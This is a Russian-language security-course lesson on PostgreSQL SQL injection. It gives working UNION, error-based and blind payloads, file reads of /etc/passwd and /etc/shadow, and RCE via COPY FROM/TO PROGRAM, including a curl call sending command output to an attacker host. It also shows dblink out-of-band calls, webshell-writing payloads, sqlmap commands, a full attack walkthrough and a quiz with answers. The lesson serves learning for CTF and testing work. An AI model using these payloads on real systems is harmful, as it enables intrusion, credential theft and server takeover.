---
id: db-postgresql
title: "PostgreSQL: инъекции на практике — COPY, файлы и RCE"
category: web
parent: web-sqli-dbms-open
difficulty: hard
order: 3
tags: [sqli, postgresql, postgres, union, copy, rce, pg_read_file, sqlmap]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "PostgreSQL от фингерпринта до RCE: pg_catalog, string_agg, pg_read_file, COPY TO/FROM PROGRAM, large objects и sqlmap."
---

PostgreSQL — «серьёзная» СУБД: Django, Rails, многие SaaS и внутренние сервисы. Для инъекций она интересна тем, что даёт мощнейшие примитивы: чтение файлов (`pg_read_file`), выполнение команд (`COPY ... FROM PROGRAM`), сетевые расширения (`dblink`) и большие объекты (`lo_import`/`lo_export`). Но всё это — под привилегиями. Сначала разберёмся с фингерпринтом и дампом, потом — с RCE.

## Фингерпринт и версия

Признаки PostgreSQL: `ERROR: syntax error at or near`, `unterminated quoted string`, `column "x" does not exist`, `ERROR: invalid input syntax for integer`. Комментарий строки — `--` (без обязательного пробела) и `/* */`. `#` не работает.

```sql
SELECT version();                     -- PostgreSQL 16.2 on x86_64-pc-linux-gnu
SELECT current_database();            -- appdb
SELECT current_user;                  -- app
SELECT session_user;
SELECT current_schema();              -- public
SHOW server_version;                  -- 16.2
SELECT inet_server_addr();            -- IP сервера
SELECT current_setting('data_directory');
```

Фингерпринт через UNION (числовые функции вернут тип — удобно):

```bash
curl -s "https://target/item?id=-1 UNION SELECT 1,version(),3-- -"
curl -s "https://target/item?id=-1 UNION SELECT 1,current_database(),3-- -"
```

## Схема и данные: pg_catalog и information_schema

PostgreSQL поддерживает и стандартный `information_schema`, и родной `pg_catalog`. `pg_catalog` полнее.

```sql
-- базы
SELECT datname FROM pg_database;
-- таблицы текущей схемы
SELECT tablename FROM pg_tables WHERE schemaname='public';
-- все таблицы пользователя
SELECT table_schema, table_name FROM information_schema.tables
  WHERE table_schema NOT IN ('pg_catalog','information_schema');
-- колонки
SELECT column_name, data_type FROM information_schema.columns
  WHERE table_name='users';
-- пользователи СУБД
SELECT usename, usesuper FROM pg_user;
-- права
SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name='users';
```

Агрегация строк — `string_agg` (аналог `GROUP_CONCAT`):

```sql
SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public';
SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users';
SELECT string_agg(username || ':' || password, E'\n') FROM users;
```

`||` — конкатенация. `E'\n'` — escape-строка с переводом строки. Тип можно привести: `CAST(x AS text)` или `x::text`.

## Error-based и blind

**Error-based через `CAST`.** Приводим данные к `int`, получаем их в тексте ошибки:

```sql
SELECT CAST(version() AS int);
-- ERROR: invalid input syntax for type integer: "PostgreSQL 16.2 ..."

SELECT CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int);
-- ERROR: invalid input syntax for type integer: "users"
```

Другой трюк — `1/(SELECT ...)` (деление на ноль с подстановкой данных) или `xmlparse`:

```sql
SELECT 1/(CASE WHEN (SELECT substr(current_database(),1,1))='a' THEN 1 ELSE 0 END);
```

**Boolean-blind:**

```sql
1 AND 1=1
1 AND (SELECT substr(current_database(),1,1))='a'
1 AND (SELECT count(*) FROM pg_tables WHERE schemaname='public')>3
```

**Time-blind — `pg_sleep`:**

```sql
1; SELECT pg_sleep(5)-- -
1 AND (SELECT 1 FROM pg_sleep(5))
1 AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END IS NULL
```

Вариант с тяжёлым запросом, если `pg_sleep` недоступен:

```sql
1 AND (SELECT count(*) FROM generate_series(1,100000000)) > 0
```

## Чтение файлов: pg_read_file, pg_ls_dir

Суперпользователь (или роль с `pg_read_server_files`) читает любые файлы:

```sql
SELECT pg_read_file('/etc/passwd');                       -- весь файл (текст)
SELECT pg_read_file('/etc/passwd', 0, 1000);              -- offset, length
SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');
SELECT pg_ls_dir('/var/lib/postgresql/');                 -- листинг каталога
SELECT pg_ls_dir('/etc/');
-- чтение бинарных файлов
SELECT encode(pg_read_binary_file('/etc/shadow'), 'base64');
```

Проверка суперпользователя:

```sql
SELECT current_setting('is_superuser');   -- on/off
SELECT usesuper FROM pg_user WHERE usename=current_user;
SELECT rolname, rolsuper, rolcreaterole FROM pg_roles;
```

Чтение в UNION-дампе:

```bash
curl -s "https://target/item?id=-1 UNION SELECT 1,pg_read_file('/etc/passwd'),3-- -"
```

## RCE: COPY TO/FROM PROGRAM и large objects

Главный вектор — `COPY ... FROM PROGRAM` (выполняет shell-команду и читает её stdout) и `COPY ... TO PROGRAM` (пишет в stdin команды). Требует суперпользователя или роли `pg_execute_server_program`.

```sql
-- выполнить команду, результат «прилетает» как данные таблицы
CREATE TABLE cmd(out text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;
-- или в одну строку (PG 11+)
COPY (SELECT '') TO PROGRAM 'curl http://attacker/$(id)';
```

Запись файла через `COPY ... TO`:

```sql
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php';
```

Large objects (тоже под суперпользователем):

```sql
SELECT lo_import('/etc/passwd');                 -- вернёт OID, содержимое в pg_largeobject
SELECT lo_export(16384, '/tmp/out.txt');         -- выгрузить LO в файл
-- залить бинарник: lo_from_bytea + lo_export
SELECT lo_from_bytea(0, decode('<base64>', 'base64'));
SELECT lo_export(16500, '/tmp/payload');
```

`dblink` — сетевое расширение (нужен `CREATE EXTENSION dblink`), полезно для SSRF/OOB:

```sql
SELECT * FROM dblink('host=attacker.com dbname=x user=x password=x', 'SELECT 1') AS t(a int);
```

## Расширения и обходы

Если фильтруется `pg_read_file`, попробуйте:

```sql
-- через pg_stat_file (только метаданные, но подтверждает доступ)
SELECT pg_stat_file('/etc/passwd');
-- COPY в таблицу и чтение оттуда
CREATE TEMP TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT * FROM t;
-- разделение через CHR
SELECT chr(65)||chr(66);   -- AB
```

Приведение и кастинг для обхода: `CAST(x AS text)`, `x::text`, `concat()`. Обход регистра ключевых слов — PostgreSQL регистронезависим для SQL, но строки регистрозависимы; `pg_catalog.pg_tables` можно писать как `pg_catalog."pg_tables"`.

## sqlmap и ручные команды

```bash
# базовая проверка
sqlmap -u 'https://target/item?id=1' --batch --dbms=postgresql --dbs

# из запроса с cookie
sqlmap -r request.txt -p id --batch --dbms=postgresql --level=3 --risk=2 --dump

# OS-команды (использует COPY ... FROM PROGRAM)
sqlmap -r request.txt -p id --batch --os-cmd='id'

# чтение файлов
sqlmap -r request.txt -p id --batch --file-read=/etc/passwd
```

Обход WAF для PostgreSQL:

```bash
sqlmap -r request.txt -p id --batch --tamper=space2comment,between,charencode,equaltolike
```

## Разобранный пример: от кавычки до команды

Цель: `https://app.local/api/items?id=1` (Django + PostgreSQL).

```bash
# Шаг 1. Ошибка
curl -s "https://app.local/api/items?id=1'" | grep -iE "syntax error|postgres"
# ERROR: syntax error at or near "'"

# Шаг 2. Число колонок
for n in 1 2 3 4; do echo -n "$n "; curl -s "https://app.local/api/items?id=1 ORDER BY $n-- -" | wc -c; done
# 1 210 / 2 210 / 3 210 / 4 45 -> 3

# Шаг 3. Вывод + версия
curl -s "https://app.local/api/items?id=-1 UNION SELECT 1,version(),3-- -"
# PostgreSQL 16.2 ...

# Шаг 4. Схема
curl -s "https://app.local/api/items?id=-1 UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'-- -"
# users,items,orders,sessions

# Шаг 5. Креды
curl -s "https://app.local/api/items?id=-1 UNION SELECT 1,string_agg(email||':'||password_hash,E'\n'),3 FROM users-- -"

# Шаг 6. Суперпользователь?
curl -s "https://app.local/api/items?id=-1 UNION SELECT 1,current_setting('is_superuser'),3-- -"
# on

# Шаг 7. Читаем файл
curl -s "https://app.local/api/items?id=-1 UNION SELECT 1,pg_read_file('/etc/passwd'),3-- -"

# Шаг 8. Выполняем команду (создаём таблицу и читаем из неё)
curl -s "https://app.local/api/items?id=1;CREATE TABLE c(o text);COPY c FROM PROGRAM 'id';-- -"
curl -s "https://app.local/api/items?id=-1 UNION SELECT 1,string_agg(o,E'\n'),3 FROM c-- -"
# uid=999(postgres) gid=999(postgres)

# Шаг 9. (опц.) webshell, если web-root известен
curl -s "https://app.local/api/items?id=1;COPY (SELECT '<%25 out.print(\"pwned\"); %25>') TO '/opt/app/web/shell.jsp';-- -"
```

## Частые ошибки

- **Ждать `SLEEP`.** В PostgreSQL это `pg_sleep`. `SLEEP(5)` даст `function sleep(integer) does not exist`.
- **Забывать про права.** `pg_read_file`/`COPY ... FROM PROGRAM` работают только для суперпользователя или специальных ролей.
- **Путать `||` и `+`.** В PostgreSQL `+` — только числа; для строк — `||` или `concat`.
- **Игнорировать типизацию.** UNION требует совпадения типов колонок: приводите `::text`, иначе `ERROR: UNION types text and integer cannot be matched`.
- **Использовать `information_schema` там, где нужен `pg_catalog`.** Например, список БД (`pg_database`) есть только в каталоге.
- **Терять контекст после `;`.** Stacked-запросы в PostgreSQL работают через libpq, но не через все ORM/драйверы (например, psycopg2 в режиме prepared statements).

## Полный справочник: команды, пейлоады, примитивы

Сводные таблицы: фингерпринт, клиентские команды, извлечение по техникам, файловые операции/RCE и привилегии. Помните: конкатенация строк в PostgreSQL — двойная вертикальная черта (не `+`), а каждый `SELECT` из данных требует источника (таблицы или `FROM`-подзапроса).

### (а) Фингерпринт и версия

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `version()` | полная версия + сборка | `SELECT version();` → `PostgreSQL 16.2 on x86_64-pc-linux-gnu` |
| `current_setting('server_version')` | версия без текста | → `16.2` |
| `current_setting('server_version_num')` | числовая версия | → `160002` |
| `current_database()` | текущая база | `appdb` |
| `current_user` | текущая роль | `app` |
| `session_user` | роль сессии | `app` |
| `current_schema()` | текущая схема | `public` |
| `SHOW data_directory` | каталог данных | `/var/lib/postgresql/16/main` |
| `inet_server_addr()` | IP сервера | `10.0.0.5` |
| `inet_server_port()` | порт | `5432` |
| `pg_postmaster_start_time()` | время старта | |
| `pg_backend_pid()` | PID бэкенда | |
| `current_setting('is_superuser')` | суперпользователь? | `on`/`off` |
| `current_setting('config_file')` | путь к postgresql.conf | |

Признак по ошибкам: `ERROR: syntax error at or near`, `unterminated quoted string`, `column "x" does not exist`, `invalid input syntax for integer`. Комментарий строки — `--` (без обязательного пробела) и `/* */`; `#` не работает.

### (б) Клиентский CLI (psql / pg_dump / pg_restore)

| Команда | Что делает | Пример |
|---------|-----------|--------|
| `psql -h H -p 5432 -U U -d DB` | подключиться | `psql -h 10.0.0.5 -U app -d appdb` |
| `-c 'SQL'` | выполнить один запрос и выйти | `psql -h H -U app -d appdb -c 'SELECT version()'` |
| `-f file.sql` | выполнить SQL-файл | `psql -h H -U app -d appdb -f dump.sql` |
| `-A` / `--no-align` | без выравнивания (tab-separated) | `psql -A -t -c 'SELECT usename FROM pg_user'` |
| `-t` / `--tuples-only` | без заголовков и счётчика | `psql -At -c '...'` |
| `-q` | тихий режим | `psql -q ...` |
| `-o file` | вывод в файл | `psql -o out.txt -c '...'` |
| `--no-psqlrc` | игнорировать `~/.psqlrc` | `psql --no-psqlrc ...` |
| `PGPASSWORD=p` env | пароль без интерактива | `PGPASSWORD=secret psql -h H -U app` |
| `PGSSLMODE=disable` env | отключить TLS | `PGSSLMODE=disable psql ...` |
| `\l` / `\list` | список баз | |
| `\dt` | таблицы | `\dt *.*` |
| `\d users` | структура таблицы | `\d+ users` |
| `\du` | роли и их атрибуты | |
| `\dn` | схемы | |
| `\dx` | расширения | |
| `\df` | функции | |
| `\c db` | переключить базу | |
| `pg_dump -h H -U U -d DB -Fc -f out.dump` | дамп в custom-формат | |
| `pg_dump -t users -s` | только схема таблицы | `pg_dump -h H -U app -t users -s` |
| `pg_dump -a -t users` | только данные | |
| `pg_dumpall -h H -U U` | все базы + роли | `pg_dumpall -U postgres > all.sql` |
| `pg_restore -d DB out.dump` | восстановление | |

### (в) Извлечение данных по техникам

| Техника | Пейлоад | Пример |
|---------|---------|--------|
| UNION (число колонок) | `ORDER BY n` | `?id=1 ORDER BY 4-- -` |
| UNION (вывод) | `-1 UNION SELECT 1,version(),3` | `?id=-1 UNION SELECT 1,version(),3-- -` |
| UNION (схема) | `string_agg(tablename,',')` | `...SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'-- -` |
| UNION (данные) | `string_agg(u \|\| ':' \|\| p, E'\n')` | `...SELECT 1,string_agg(username \|\| ':' \|\| password,E'\n'),3 FROM users-- -` |
| Error-based | `CAST(X AS int)` | `SELECT CAST(version() AS int)` → `invalid input syntax for type integer: "PostgreSQL 16.2..."` |
| Error-based | `1/(CASE WHEN cond THEN 1 ELSE 0 END)` | `SELECT 1/(CASE WHEN substr(current_database(),1,1)='a' THEN 1 ELSE 0 END)` |
| Boolean-blind | `AND 1=1` / `AND 1=2` | `?id=1 AND 1=2-- -` |
| Boolean-blind | `substr()`/`ascii()` | `?id=1 AND (SELECT substr(current_database(),1,1))='a'-- -` |
| Time-blind | `pg_sleep(5)` | `?id=1; SELECT pg_sleep(5)-- -` |
| Time-blind | `CASE WHEN ... THEN pg_sleep(5)` | `?id=1 AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END IS NULL-- -` |
| Time-blind (без pg_sleep) | тяжёлый `generate_series` | `?id=1 AND (SELECT count(*) FROM generate_series(1,100000000))>0` |
| OOB (HTTP) | `COPY ... TO PROGRAM 'curl'` | `COPY (SELECT '') TO PROGRAM 'curl http://attacker/$(id)'` |
| OOB (DNS/HTTP) | `dblink` | `SELECT * FROM dblink('host=attacker.com dbname=x user=x password=x','SELECT 1') AS t(a int)` |
| Stacked | `;` (через libpq) | `?id=1; COPY c FROM PROGRAM 'id';-- -` |

### (г) Чтение/запись файлов и RCE

| Примитив | Что делает | Пример |
|----------|-----------|--------|
| `pg_read_file(path)` | читает текстовый файл (суперпользователь / `pg_read_server_files`) | `UNION SELECT 1,pg_read_file('/etc/passwd'),3-- -` |
| `pg_read_file(path, off, len)` | читает диапазон | `pg_read_file('/etc/passwd',0,1000)` |
| `pg_read_binary_file(path)` | читает бинарник (с `encode(...,'base64')`) | `SELECT encode(pg_read_binary_file('/etc/shadow'),'base64')` |
| `pg_ls_dir(dir)` | листинг каталога | `SELECT pg_ls_dir('/etc/')` |
| `pg_stat_file(path)` | метаданные файла | `SELECT pg_stat_file('/etc/passwd')` |
| `COPY t FROM '/path'` | читает файл в таблицу | `CREATE TEMP TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT * FROM t;` |
| `COPY (SELECT ...) TO '/path'` | пишет файл | `COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php'` |
| `COPY t FROM PROGRAM 'cmd'` | выполняет команду, читает stdout | `CREATE TABLE c(o text); COPY c FROM PROGRAM 'id'; SELECT * FROM c;` |
| `COPY (SELECT '') TO PROGRAM 'cmd'` | выполняет команду (PG 11+) | `COPY (SELECT '') TO PROGRAM 'curl http://attacker/$(id)'` |
| `lo_import(path)` | грузит файл в large object | `SELECT lo_import('/etc/passwd')` |
| `lo_export(oid, path)` | выгружает LO в файл | `SELECT lo_export(16384,'/tmp/out')` |
| `lo_from_bytea(0, data)` | создаёт LO из байтов | `SELECT lo_from_bytea(0, decode('<base64>','base64'))` |
| `lo_put` / `lo_get` | писать/читать LO по частям | `SELECT lo_put(16500, 0, 'data')` |
| `dblink` | сетевой запрос (SSRF/OOB) | `CREATE EXTENSION dblink; SELECT dblink_connect('host=...')` |
| `pg_execute_server_program` роль | даёт право `COPY ... PROGRAM` | `GRANT pg_execute_server_program TO app;` |
| `pg_write_server_files` роль | даёт право `COPY ... TO` | |

### (д) Привилегии и эскалация

| Запрос | Что делает | Пример |
|--------|-----------|--------|
| `SELECT usename,usesuper FROM pg_user` | пользователи и суперправа | `UNION SELECT 1,string_agg(usename \|\| ':' \|\| usesuper,','),3 FROM pg_user-- -` |
| `SELECT rolname,rolsuper,rolcreaterole,rolcreatedb FROM pg_roles` | атрибуты ролей | |
| `current_setting('is_superuser')` | я суперпользователь? | `on`/`off` |
| `SELECT * FROM pg_shadow` | логины + хэши паролей (суперпользователь) | `SELECT usename,passwd FROM pg_shadow` |
| `SELECT * FROM pg_authid` | роли + хэши (суперпользователь) | |
| `SELECT * FROM pg_auth_members` | членство в ролях | |
| `SELECT rolname FROM pg_roles WHERE rolsuper` | все суперпользователи | |
| `\du` | роли в psql | |
| `SELECT * FROM pg_read_server_files` | роли с правом чтения файлов | `SELECT * FROM pg_roles WHERE rolname LIKE 'pg_%files'` |
| `CREATE ROLE x SUPERUSER LOGIN PASSWORD 'p'` | создать суперпользователя | |
| `ALTER ROLE app SUPERUSER` | повысить роль (суперпользователь) | |
| `SET ROLE other` | переключиться на роль | `SET ROLE postgres;` |

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какая функция PostgreSQL делает паузу для time-based blind?"
  options:
    - "SLEEP"
    - "pg_sleep"
    - "WAITFOR DELAY"
    - "BENCHMARK"
  answer: 1
  explanation: "pg_sleep(seconds) — родная функция задержки PostgreSQL."
- question: "Какая конструкция даёт RCE в PostgreSQL?"
  options:
    - "xp_cmdshell"
    - "COPY ... FROM PROGRAM"
    - "load_extension"
    - "dbms_java"
  answer: 1
  explanation: "COPY TO/FROM PROGRAM выполняет shell-команду (суперпользователь)."
- question: "Как агрегировать строки в одну в PostgreSQL?"
  options:
    - "GROUP_CONCAT"
    - "LISTAGG"
    - "string_agg"
    - "WM_CONCAT"
  answer: 2
  explanation: "string_agg(expr, delimiter) — аналог GROUP_CONCAT."
- question: "Какая функция читает файл на сервере?"
  options:
    - "LOAD_FILE"
    - "pg_read_file"
    - "OPENROWSET"
    - "UTL_FILE"
  answer: 1
  explanation: "pg_read_file доступна суперпользователю и ролям pg_read_server_files."
- question: "Как в PostgreSQL вытащить данные через текст ошибки?"
  options:
    - "extractvalue(1, ...)"
    - "CAST((SELECT ...) AS int)"
    - "CONVERT(int, ...)"
    - "xmltype(...)"
  answer: 1
  explanation: "Приведение строки к integer даёт ошибку с её содержимым."
```

## Где пригодится

- **CTF (Web):** Postgres-задачи часто требуют `pg_read_file` или `COPY FROM PROGRAM` для флага.
- **Bug bounty:** Django/Rails/SaaS на Postgres — частая цель; дамп и чтение файлов критичны.
- **Пентест:** RCE через `COPY` — один из немногих «прямых» путей к shell из веба.
- **Работа (AppSec):** знание `pg_execute_server_program`, `pg_read_server_files` и hardening'а ролей.
